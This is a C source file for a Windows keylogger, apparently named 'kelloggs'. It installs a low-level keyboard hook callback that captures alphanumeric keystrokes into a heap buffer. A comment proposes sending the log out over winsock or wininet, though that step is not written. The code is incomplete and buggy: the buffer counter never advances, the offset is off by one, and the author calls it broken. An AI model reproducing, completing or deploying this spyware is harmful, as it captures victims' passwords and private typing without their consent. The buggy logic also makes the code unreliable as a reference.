#include <stdio.h>
#include "kelloggs.h"
#include "config.h"

kldata* logdata = NULL;

DWORD append_log_data(kldata* kld, CHAR* data, UINT64 size) {
	
	if (!can_log_data(kld, size)) {
		return 0;
	}

	UINT64 startOffset = (kld->used + 1);
	UINT64 i;
/*	printf("Start Offset: %lld \n", startOffset);
	printf("Size size: %lld \n", size);
	printf(" kld used: %lld \n", kld->used);

	printf("Data: %s\n", data);
	*/
	//WriteFile(), OpenFile(), SendFileusing winsock or wininet, idgaf 1 fuck
	for (i = 0; i < size; i++) {
		// broken lmfao
		kld->data[startOffset + i] = data[i];

	}

	//printf("KldData: %s\n", kld->data);
	return 0;
}

DWORD can_log_data(kldata* kld, UINT64 datasize) {
	return (kld->size - kld->used) >= datasize;
}

LRESULT CALLBACK NUTRITIOUS_BREAKFAST(int nCode, WPARAM wParam, LPARAM lParam) {

	if (logdata == NULL) {
		logdata = HeapAlloc(GetProcessHeap(), 0, sizeof(kldata));

		if (logdata == NULL) {
			return 0;
		}

		RtlSecureZeroMemory(logdata, sizeof(kldata));

		logdata->data = HeapAlloc(GetProcessHeap(), 0, LOGBUFFER_SIZE);

		if (logdata->data == NULL) {
			return 0;
		}

		RtlSecureZeroMemory(logdata->data, LOGBUFFER_SIZE);

		logdata->used = 0;
		logdata->size = LOGBUFFER_SIZE;
	}

	KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;

	DWORD vk = data->vkCode;

	switch (wParam) {
	case WM_KEYDOWN:
		break;
	case WM_KEYUP:
		if (IS_NUMERIC_VK(vk) || IS_ALPHA_VK(vk)) {
   			UINT k = MapVirtualKeyA(vk, MAPVK_VK_TO_CHAR);
			
			append_log_data(logdata, (CHAR*)&k, sizeof(UINT));
			return 0;
		} 
		else {
			switch (vk) {
			case VK_OEM_MINUS:
				break;
			case VK_OEM_PLUS:
				break;
			case VK_SHIFT:
				break;
			case VK_CAPITAL:
				break;
			case VK_RETURN:
				break;
			case VK_BACK:
				break;
			case VK_TAB:
				break;
			case VK_CONTROL:
				break;
			case VK_MENU:
				break;
			case VK_DELETE:
				break;
			case VK_HOME:
				break;
			case VK_END:
				break;
			}
		}
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);

}